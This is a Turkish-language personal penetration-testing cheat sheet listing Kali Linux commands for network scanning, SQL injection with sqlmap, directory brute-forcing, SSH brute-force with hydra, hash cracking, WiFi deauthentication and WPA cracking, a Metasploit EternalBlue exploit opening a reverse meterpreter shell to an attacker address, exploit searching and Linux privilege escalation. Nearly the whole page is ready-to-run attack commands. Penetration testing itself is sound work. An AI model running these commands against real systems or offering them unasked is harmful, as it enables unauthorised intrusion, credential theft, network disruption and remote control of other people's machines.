CyberTools – Kişisel Siber Güvenlik Ajandası

Bu sayfa yalnızca sana özeldir dostum. Tüm sızma test araçları, Kali Linux komutları ve kendi not kutun bu sayfada yer alır.

1. Ağ Keşif ve Bilgi Toplama

  • ifconfig – IP adresi ve ağ arabirimlerini gösterir
    ifconfig
  • netdiscover – Ağdaki cihazları keşfeder
    netdiscover -r 192.168.1.0/24
  • whois, dig, nslookup – DNS ve domain bilgi toplama

2. Port Tarama & Servis Keşfi

  • nmap – Port tarama
    nmap -sS -T4 192.168.1.1
  • masscan – Hızlı port tarama
    masscan 192.168.1.0/24 -p80

3. Web Uygulama Test Araçları

  • sqlmap – SQL Injection testi
    sqlmap -u "http://site.com/page.php?id=1" --dbs
  • gobuster – Dizin brute-force
    gobuster dir -u http://site.com -w /wordlist.txt
  • nikto – Web sunucusu zafiyet tarayıcı

4. Şifre Kırma ve Erişim Testi

  • hydra – SSH brute-force
    hydra -l admin -P rockyou.txt 192.168.1.1 ssh
  • john the ripper – Hash kırma
    john --wordlist=rockyou.txt hashes.txt

5. Kablosuz Ağ Saldırıları

  • airmon-ng – Monitor moda geç
    airmon-ng start wlan0
  • airodump-ng – Ağları keşfet
    airodump-ng wlan0mon
  • aireplay-ng – Deauth saldırısı
    aireplay-ng -0 10 -a [BSSID] wlan0mon
  • aircrack-ng – WPA handshake kır
    aircrack-ng -w rockyou.txt dump.cap

6. Metasploit Kullanımı

  • msfconsole – Başlat
  • use exploit/windows/smb/ms17_010_eternalblue – Exploit seç
  • set RHOSTS 192.168.1.10 – Hedef belirle
  • set PAYLOAD windows/meterpreter/reverse_tcp – Payload seç
  • set LHOST 192.168.1.5 – Saldırgan IP
  • exploit – Çalıştır

7. Exploit Veritabanı

  • searchsploit wordpress – Exploit araması
  • searchsploit -x path/to/exploit – Detay görüntüle
  • searchsploit -u – Güncelle

8. Privilege Escalation (Linux)

  • sudo -l – Sudo izinlerini göster
  • find / -perm -4000 2>/dev/null – SUID dosyaları
  • uname -a + searchsploit kernel – Kernel exploit kontrolü
  • ./linpeas.sh – Otomatik privesc aracı
